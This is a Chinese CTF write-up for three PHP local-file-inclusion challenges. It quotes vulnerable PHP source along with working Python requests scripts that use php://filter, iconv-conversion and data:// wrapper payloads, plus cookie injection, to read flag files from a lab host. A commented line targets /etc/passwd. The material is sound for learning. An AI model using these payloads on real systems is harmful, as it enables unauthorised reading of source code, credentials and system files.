# file_include

知识点：convert.iconv.* 绕过

[详解php://filter以及死亡绕过](https://blog.csdn.net/woshilnp/article/details/117266628)

[writeup](https://blog.csdn.net/yuanxu8877/article/details/127607264)

`php://filter/convert.base64-encode/resource=index.php`如果没有过滤的话，可直接读取当前文件内容，同理一旦绕过过滤，check.php和flag.php就都能读到了，详细绕过过滤的教程见上面。

```python
import requests

# 目标URL
url = "http://61.147.171.105:60022/"
# payload= {'filename': '/etc/passwd'}
payload= {'filename': 'php://filter/convert.iconv.SJIS*.UCS-4*/resource=flag.php'}

response = requests.get(url, params=payload)
print(response.text)
```

# fileclude

```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET["file1"]) && isset($_GET["file2"]))
{
    $file1 = $_GET["file1"];
    $file2 = $_GET["file2"];
    if(!empty($file1) && !empty($file2))
    {
        if(file_get_contents($file2) === "hello ctf")
        {
            include($file1);
        }
    }
    else
        die("NONONO");
}
```

感觉和上面的一样，甚至没有校验会更简单。但难点在`file_get_contents($file2) === "hello ctf"`这部分的处理。

[参考答案](https://blog.csdn.net/weixin_42789937/article/details/128060363)里面对于`php://`的分析挺好。这道题扩充了输入的知识。

```python
import requests
# 目标URL
url = "http://61.147.171.105:55818/"
# payload= {'filename': '/etc/passwd'}
payload= {
    'file1': 'php://filter/read=convert.base64-encode/resource=flag.php',
    'file2': 'data://text/plain,hello ctf'
}

response = requests.get(url, params=payload)
print(response.text)
```

# fileinclude

查看源码发现里面有php注释，如下

```php
<?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }
error_reporting(E_ALL);
$lan = $_COOKIE['language'];
if(!$lan)
{
	@setcookie("language","english");
	@include("english.php");
}
else
{
	@include($lan.".php");
}
$x=file_get_contents('index.php');
echo $x;
?>
```

存在文件包含，在`cookie`中构造`php://filter/convert.base64-encode/resource=/var/www/html/flag`就能读出flag，然后解码就可以。



